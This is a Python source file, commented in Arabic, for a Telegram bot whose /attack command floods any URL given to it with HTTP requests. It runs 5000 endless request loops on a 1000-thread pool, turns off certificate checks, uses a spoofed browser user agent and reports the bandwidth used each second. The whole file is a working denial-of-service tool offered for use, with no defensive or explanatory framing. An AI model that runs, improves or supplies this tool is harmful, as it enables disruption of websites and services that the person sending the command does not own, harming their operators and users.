import logging
import requests
import threading
import urllib3
import time
from concurrent.futures import ThreadPoolExecutor
from telegram import Update, Bot
from telegram.ext import Updater, CommandHandler, CallbackContext

# إعدادات تسجيل الدخول
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# تعطيل التحقق من صحة شهادة SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# رمز البوت (استبدله برمز البوت الخاص بك)
TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'

fake_ip = '182.21.20.32'

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
}

# إنشاء جلسة واحدة للاستخدام المتكرر
session = requests.Session()
session.verify = False

# متغير لتخزين عدد البايتات المنقولة
bytes_transferred = 0
lock = threading.Lock()

def attack(url):
    global bytes_transferred
    while True:
        try:
            response = session.get(url, headers=headers)
            with lock:
                bytes_transferred += len(response.content)
            print("تم إرسال الطلب إلى:", url)
        except Exception as e:
            print("حدث خطأ:", e)

def start_attack(url):
    with ThreadPoolExecutor(max_workers=1000) as executor:
        for _ in range(5000):
            executor.submit(attack, url)

    try:
        response = session.get(url, headers=headers)
        print(response.text)
    except Exception as e:
        print("حدث خطأ أثناء الطلب الأولي:", e)

def calculate_speed():
    global bytes_transferred
    while True:
        time.sleep(1)
        with lock:
            speed = bytes_transferred / (1024 * 1024)
            bytes_transferred = 0
        print(f"سرعة النقل: {speed:.2f} MB/s")

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('مرحبًا! أرسل /attack مع الرابط لبدء الهجوم.')

def attack_command(update: Update, context: CallbackContext) -> None:
    if len(context.args) > 0:
        url = context.args[0]
        update.message.reply_text(f"بدء الهجوم على {url}")
        
        # بدء خيط حساب السرعة
        speed_thread = threading.Thread(target=calculate_speed)
        speed_thread.daemon = True
        speed_thread.start()

        # بدء الهجوم
        start_attack(url)
    else:
        update.message.reply_text('يرجى تقديم رابط الهدف.')

def main():
    updater = Updater(TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("attack", attack_command))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
